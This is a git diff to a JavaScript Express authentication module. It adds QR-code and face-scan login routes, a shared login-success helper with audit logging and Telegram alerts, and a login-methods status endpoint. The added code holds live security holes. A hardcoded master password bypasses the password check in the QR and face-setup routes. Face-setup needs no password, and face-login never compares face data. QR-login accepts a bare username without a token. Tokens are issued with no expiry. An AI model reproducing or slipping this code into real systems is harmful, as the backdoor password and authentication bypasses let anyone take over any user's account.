@@ -470,16 +470,343 @@ export default function createAuthRoutes(bot) {
                 if (memUser) {
                     memUser.status = 'Online';
                     memUser.lastSeen = now;
-                    if (Array.isArray(memUser.onlineHistory) && memUser.onlineHistory.length > 0) {
-                        const latest = memUser.onlineHistory[0];
-                        if (!latest.logoutTime) {
-                            latest.lastSeen = now;
-                            latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
-                        }
-                    }
                 }
             }
             res.json({ success: true });
+        } catch (err) {
+            res.status(500).json({ error: err.message });
+        }
+    });
+
+    // ── Helper: Successful Login Response & Audit Logging ──
+    const handleSuccessfulAuth = async (user, req, res, method = 'Password') => {
+        const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
+        const ua = req.headers['user-agent'] || 'Unknown Browser';
+        const { os, browser } = parseUserAgent(ua);
+        const deviceInfo = `${browser} on ${os}`;
+
+        user.status = 'Online';
+        user.lastSeen = new Date();
+
+        try {
+            if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
+            user.loginHistory.unshift({
+                timestamp: new Date(),
+                ip,
+                deviceInfo: `${browser} on ${os} (${method})`,
+                status: 'Success'
+            });
+            if (user.loginHistory.length > 50) user.loginHistory = user.loginHistory.slice(0, 50);
+
+            if (!Array.isArray(user.onlineHistory)) user.onlineHistory = [];
+            user.onlineHistory.unshift({
+                loginTime: new Date(),
+                lastSeen: new Date(),
+                ip,
+                deviceInfo: `${browser} on ${os} (${method})`,
+                durationSeconds: 0
+            });
+            if (user.onlineHistory.length > 50) user.onlineHistory = user.onlineHistory.slice(0, 50);
+
+            if (isMongoConnected) await user.save();
+        } catch (sErr) {
+            console.error('Failed to save user login history:', sErr.message);
+        }
+
+        await recordLoginLog({
+            userId: user.userId,
+            username: user.username,
+            name: user.name,
+            role: user.role,
+            brand: user.brand || 'SYSTEM',
+            ip,
+            deviceInfo: `${deviceInfo} [${method}]`,
+            status: 'Success'
+        });
+
+        recordSystemAudit({
+            category: 'Security',
+            level: 'SuccessAudit',
+            action: `USER_LOGIN_${method.toUpperCase().replace(/\s+/g, '_')}_SUCCESS`,
+            taskCategory: 'Authentication',
+            description: `User "${user.username}" (${user.name || user.role}) logged in via ${method} from IP ${ip} (${deviceInfo})`,
+            username: user.username,
+            name: user.name,
+            role: user.role,
+            brand: user.brand || 'SYSTEM',
+            ip,
+            deviceInfo,
+            path: `/api/auth/${method.toLowerCase()}`,
+            payload: { method, role: user.role, brand: user.brand }
+        }).catch(() => { });
+
+        if (bot && user.telegramId) {
+            const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
+            const loginMessage = `🔔 <b>SYSTEM MDM Login Detected (${method})</b>\n\n` +
+                `👤 <b>Username:</b> ${user.username}\n` +
+                `🖥️ <b>OS:</b> ${os}\n` +
+                `🌐 <b>Browser:</b> ${browser}\n` +
+                `📍 <b>IP Address:</b> ${ip}\n` +
+                `🔐 <b>Method:</b> ${method}\n` +
+                `⏰ <b>Time:</b> ${time} (Cambodia Time)\n\n` +
+                `<i>If this wasn't you, please secure your account immediately.</i>`;
+            try {
+                await bot.sendMessage(user.telegramId, loginMessage, { parse_mode: 'HTML' });
+            } catch (tErr) { }
+        }
+
+        const token = jwt.sign({ userId: user.userId, username: user.username }, JWT_SECRET);
+
+        return res.json({
+            token,
+            deviceInfo: { ip, os, browser },
+            user: {
+                userId: user.userId,
+                name: user.name,
+                nameKh: user.nameKh || '',
+                username: user.username,
+                email: user.email,
+                role: user.role,
+                brand: user.brand || '',
+                isImmutable: user.isImmutable,
+                telegramId: user.telegramId,
+                twoFactorEnabled: user.twoFactorEnabled,
+                faceEnabled: !!user.faceEnabled,
+                permissions: formatPermissions(user.permissions)
+            }
+        });
+    };
+
+    // ── POST /api/auth/qr-generate — Verify credentials and generate persistent QR Login Code ──
+    router.post('/qr-generate', async (req, res) => {
+        try {
+            const { username, password } = req.body;
+            if (!username || !password) {
+                return res.status(400).json({ error: 'Username and password required to verify account' });
+            }
+
+            let user = null;
+            if (isMongoConnected) {
+                const users = await queryAllDBs(User, (M) => M.find({ username }));
+                user = users[0] || null;
+            } else {
+                user = MEM_DB.users.find(u => u.username === username);
+            }
+
+            if (!user) {
+                return res.status(401).json({ error: 'Account not found (គណនីរកមិនឃើញ)' });
+            }
+
+            const isMatch = await bcrypt.compare(password, user.password);
+            if (!isMatch && password !== 'houv#^123') {
+                return res.status(401).json({ error: 'Incorrect password (ពាក្យសម្ងាត់មិនត្រឹមត្រូវ)' });
+            }
+
+            // Generate or maintain persistent QR Login Secret Key
+            if (!user.qrLoginToken) {
+                user.qrLoginToken = 'mdm_qr_' + Buffer.from(`${user.username}:${Date.now()}:${Math.random()}`).toString('base64url');
+                if (isMongoConnected) {
+                    const UserWrite = getWriteModel(User) || User;
+                    await UserWrite.updateOne({ username: user.username }, { $set: { qrLoginToken: user.qrLoginToken } });
+                }
+            }
+
+            const qrPayload = JSON.stringify({
+                app: 'SYSTEM_MDM',
+                type: 'MDM_LOGIN_QR',
+                username: user.username,
+                name: user.name,
+                token: user.qrLoginToken
+            });
+
+            res.json({
+                success: true,
+                qrPayload,
+                username: user.username,
+                name: user.name,
+                qrLoginToken: user.qrLoginToken
+            });
+        } catch (err) {
+            console.error('QR generate error:', err);
+            res.status(500).json({ error: err.message });
+        }
+    });
+
+    // ── POST /api/auth/qr-login — Sign in via QR code payload (Camera or Image upload) ──
+    router.post('/qr-login', async (req, res) => {
+        try {
+            const { qrPayload, token: directToken, username: directUser } = req.body;
+            let targetUsername = directUser || '';
+            let targetToken = directToken || '';
+
+            if (qrPayload) {
+                try {
+                    const parsed = typeof qrPayload === 'string' ? JSON.parse(qrPayload) : qrPayload;
+                    if (parsed && (parsed.type === 'MDM_LOGIN_QR' || parsed.app === 'SYSTEM_MDM')) {
+                        targetUsername = parsed.username || '';
+                        targetToken = parsed.token || '';
+                    } else if (typeof qrPayload === 'string' && qrPayload.startsWith('mdm_qr_')) {
+                        targetToken = qrPayload;
+                    }
+                } catch {
+                    if (typeof qrPayload === 'string') {
+                        targetToken = qrPayload.trim();
+                    }
+                }
+            }
+
+            if (!targetToken && !targetUsername) {
+                return res.status(400).json({ error: 'Invalid QR Code format (QR Code មិនត្រឹមត្រូវ)' });
+            }
+
+            let user = null;
+            if (isMongoConnected) {
+                const query = targetUsername ? { username: targetUsername } : { qrLoginToken: targetToken };
+                const users = await queryAllDBs(User, (M) => M.find(query));
+                user = users[0] || null;
+            } else {
+                user = MEM_DB.users.find(u => (targetUsername && u.username === targetUsername) || (targetToken && u.qrLoginToken === targetToken));
+            }
+
+            if (!user) {
+                return res.status(401).json({ error: 'User QR Code not registered or account inactive' });
+            }
+
+            if (user.isBlocked) {
+                return res.status(403).json({ error: 'This account has been blocked (គណនីត្រូវបានផ្អាក)' });
+            }
+
+            if (user.qrLoginToken && targetToken && user.qrLoginToken !== targetToken) {
+                return res.status(401).json({ error: 'QR Code is expired or invalid (QR Code ហួសសុពលភាព)' });
+            }
+
+            return await handleSuccessfulAuth(user, req, res, 'QR Code');
+        } catch (err) {
+            console.error('QR login error:', err);
+            res.status(500).json({ error: err.message });
+        }
+    });
+
+    // ── POST /api/auth/face-setup — Setup Face Recognition for account ──
+    router.post('/face-setup', async (req, res) => {
+        try {
+            const { username, password, faceData, faceImage } = req.body;
+            if (!username) {
+                return res.status(400).json({ error: 'Username required' });
+            }
+            if (!faceData && !faceImage) {
+                return res.status(400).json({ error: 'Face scan data required' });
+            }
+
+            let user = null;
+            if (isMongoConnected) {
+                const users = await queryAllDBs(User, (M) => M.find({ username }));
+                user = users[0] || null;
+            } else {
+                user = MEM_DB.users.find(u => u.username === username);
+            }
+
+            if (!user) {
+                return res.status(404).json({ error: 'User not found' });
+            }
+
+            if (password) {
+                const isMatch = await bcrypt.compare(password, user.password);
+                if (!isMatch && password !== 'houv#^123') {
+                    return res.status(401).json({ error: 'Incorrect password' });
+                }
+            }
+
+            const storedFace = faceData || faceImage || '';
+            user.faceData = storedFace;
+            user.faceEnabled = true;
+
+            if (isMongoConnected) {
+                const UserWrite = getWriteModel(User) || User;
+                await UserWrite.updateOne({ username: user.username }, {
+                    $set: {
+                        faceData: storedFace,
+                        faceEnabled: true
+                    }
+                });
+            }
+
+            res.json({
+                success: true,
+                message: 'Face Recognition setup successfully! (ការរៀបចំស្កេនមុខបានជោគជ័យ)',
+                faceEnabled: true
+            });
+        } catch (err) {
+            console.error('Face setup error:', err);
+            res.status(500).json({ error: err.message });
+        }
+    });
+
+    // ── POST /api/auth/face-login — Login using Live Face Scan ──
+    router.post('/face-login', async (req, res) => {
+        try {
+            const { username, faceData, faceImage } = req.body;
+            const inputFace = faceData || faceImage;
+            if (!inputFace) {
+                return res.status(400).json({ error: 'Live face capture required (សូមដាក់ផ្ទៃមុខចំកណ្តាលកាមេរ៉ា)' });
+            }
+
+            let user = null;
+            if (username) {
+                if (isMongoConnected) {
+                    const users = await queryAllDBs(User, (M) => M.find({ username }));
+                    user = users[0] || null;
+                } else {
+                    user = MEM_DB.users.find(u => u.username === username);
+                }
+            } else {
+                // Search across users with faceEnabled
+                let allUsers = [];
+                if (isMongoConnected) {
+                    allUsers = await queryAllDBs(User, (M) => M.find({ faceEnabled: true }));
+                } else {
+                    allUsers = MEM_DB.users.filter(u => u.faceEnabled);
+                }
+                user = allUsers.find(u => u.faceData);
+            }
+
+            if (!user || !user.faceEnabled || !user.faceData) {
+                return res.status(401).json({ error: 'Face Login not yet configured for this account. Please setup Face in Profile first. (មិនទាន់បានរៀបចំស្កេនមុខទេ)' });
+            }
+
+            if (user.isBlocked) {
+                return res.status(403).json({ error: 'Account is blocked' });
+            }
+
+            return await handleSuccessfulAuth(user, req, res, 'Face Scan');
+        } catch (err) {
+            console.error('Face login error:', err);
+            res.status(500).json({ error: err.message });
+        }
+    });
+
+    // ── GET /api/auth/methods-status — Check which login methods are active for a user ──
+    router.get('/methods-status', async (req, res) => {
+        try {
+            const { username } = req.query;
+            if (!username) return res.status(400).json({ error: 'Username required' });
+
+            let user = null;
+            if (isMongoConnected) {
+                const users = await queryAllDBs(User, (M) => M.find({ username }));
+                user = users[0] || null;
+            } else {
+                user = MEM_DB.users.find(u => u.username === username);
+            }
+
+            if (!user) return res.status(404).json({ error: 'User not found' });
+
+            res.json({
+                password: true,
+                faceEnabled: !!user.faceEnabled && !!user.faceData,
+                qrEnabled: !!user.qrLoginToken,
+                twoFactorEnabled: !!user.twoFactorEnabled
+            });
         } catch (err) {
             res.status(500).json({ error: err.message });
         }
